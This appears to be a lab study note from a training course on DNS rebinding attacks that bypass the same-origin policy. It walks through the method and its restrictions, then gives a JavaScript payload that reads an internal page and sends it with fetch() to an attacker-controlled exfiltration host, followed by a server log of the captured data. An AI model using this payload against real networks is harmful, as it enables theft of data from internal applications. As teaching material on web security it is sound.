# DNS Rebinding: Same-Origin Policy Bypass

# **Setting & Methodology**

- A victim is browsing the internet on their work laptop, located within their company network
- Internal accessible application hosting confidentials infos `http://192.168.178.1`
1. *The attacker (us) obtains the domain name `attacker.htb` and configures the DNS server, with a low TTL, to resolve the domain name to the IP address of the web application running a malicious JavaScript payload.*
2. *The victim accesses the attacker's web application at `http://attacker.htb`, resolving `attacker.htb` to the attacker's web application's IP address and loading the malicious JavaScript payload*
3. *The attacker updates/`rebinds` the DNS setting of the domain `attacker.htb` to resolve to `192.168.178.1` (DNS rebinding)*
4. *The JavaScript payload makes an HTTP `GET` request to `http://attacker.htb/secret`, and, due to DNS rebinding, `attacker.htb` now resolves to `192.168.178.1`. Therefore, the victim's browser sends the request to the internal web application. Since the origin does not differ (i.e., scheme, host, and port are the same), it is `not` considered a `cross-origin request`. As a result, the JavaScript code can access the response without violating the `Same-Origin` policy.*
5. *The JavaScript payload exfiltrates the response to another attacker-controlled domain, for example, `http://exfiltrate.attacker.htb`*

![Untitled](DNS%20Rebinding%20Same-Origin%20Policy%20Bypass/Untitled.png)

- Instead of exfiltrating the response, the attacker could use the same methodology to manipulate the internal web application by sending different HTTP requests such as `POST`, `PUT`, or `DELETE`

<aside>
⚠️ **Note:** The port the internal web application runs on must be the same as the attacker web application to ensure that the origin matches. For instance, if the internal web application runs on port `8000`, the attacker web application must also run on the same port, i.e., `http://attacker.htb:8000`. Thus, the attacker must know the IP address and port of the internal web application beforehand for a successful attack.

</aside>

# **Exploitation**

```jsx
<script>
    startAttack();

    function startAttack(){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://www.attacker.htb/secret', true);
        xhr.onload = () => {
          fetch('http://exfiltrate.attacker.htb:1337/log?data=' + btoa(xhr.response));
        };
        xhr.send();

    setTimeout(startAttack, 2000);
    }
</script>
```

```jsx
python3 -m http.server 1337    

Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
127.0.0.1 - - [13/May/2023 10:29:09] code 404, message File not found
127.0.0.1 - - [13/May/2023 10:29:09] "GET /log?data=VGhpcyBpcyBzZWNyZXQgZGF0YSE= HTTP/1.1" 404 -
```

# **Restrictions**

- Internal applications protected by authentication are effectively safe from DNS rebinding attacks because the session cookies of victims are not sent with requests, even if they are logged in to the internal application
- That is because the victim's browser thinks it is communicating with the origin `http://attacker.htb` and thus sends cookies associated with this origin with the request
- Modern browsers implement `DNS caching`, a technique that caches the result of DNS resolutions for a configurable period, regardless of the actual TTL of the DNS record
    - To bypass `DNS caching`, we need to wait for this period before the DNS rebinding attack can succeed, which is why our payload called itself every 2 seconds
    - Firefox provides the `network.dnsCacheExpiration` setting to alter the caching period